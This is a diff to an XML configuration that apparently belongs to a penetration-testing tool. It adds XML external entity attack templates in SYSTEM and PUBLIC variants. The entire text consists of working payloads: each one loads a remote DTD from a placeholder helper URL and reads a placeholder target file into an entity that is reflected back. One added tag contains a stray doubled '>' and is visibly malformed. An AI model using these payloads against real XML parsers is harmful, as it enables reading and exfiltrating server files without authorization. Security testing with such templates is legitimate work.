@@ -9,14 +9,27 @@
     <externalResources>true</externalResources>
 </params>
 <attackvectors>
-<attackvector>
+<attackvector type="system" default="true">>
 <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
 <!ENTITY % remote SYSTEM "§tf_helperURL§">
 %remote;
 ]>
 <data attrib='&internal;'/>]]></directMessage>
-<helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
+<helperMessage><![CDATA[ <!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;]]></helperMessage>
+</attackvector>
+<attackvector type="public" >
+<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % remote PUBLIC p "§tf_helperURL§">
+%remote;
+]>
+<data attrib='&internal;'/>]]></directMessage>
+<helperMessage><![CDATA[ <!ENTITY % payload PUBLIC p2 "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;]]></helperMessage>
 </attackvector>
 </attackvectors>
 </config>
